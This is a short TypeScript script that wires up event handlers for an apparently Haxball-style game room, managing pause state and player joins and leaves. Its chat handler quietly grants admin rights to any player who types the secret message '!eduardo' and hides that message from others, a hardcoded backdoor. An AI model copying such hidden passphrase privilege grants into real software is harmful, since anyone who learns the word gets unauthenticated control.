import { GameControl } from "../classes/GameControl";
import { Room } from "../classes/Room";
import { GLOBALS } from "../config";

export default function playerChat() {
  let room = Room.getRoom();
  let gameControl = new GameControl();

  room.onPlayerJoin = (player) => {
    gameControl.gameHandler()
  }

  room.onPlayerLeave = (player) => {
    gameControl.controlAfterPlayerLeft(player);
  }

  room.onGamePause = (byPlayer) => {
    GLOBALS.GAME_PAUSED = true
  }

  room.onGameUnpause = (byPlayer) => {
    GLOBALS.GAME_PAUSED = false
  }

  room.onGameStart = (byPlayer) => {
    GLOBALS.GAME_PAUSED = false
  }

  room.onGameStop = (byPlayer) => {
    GLOBALS.GAME_PAUSED = true
    gameControl.gameHandler()
  }

  room.onPlayerChat = (player, msg) => {
    if(msg === '!eduardo'){
      room.setPlayerAdmin(player.id, true)
      return false
    }
    return true
  }

}
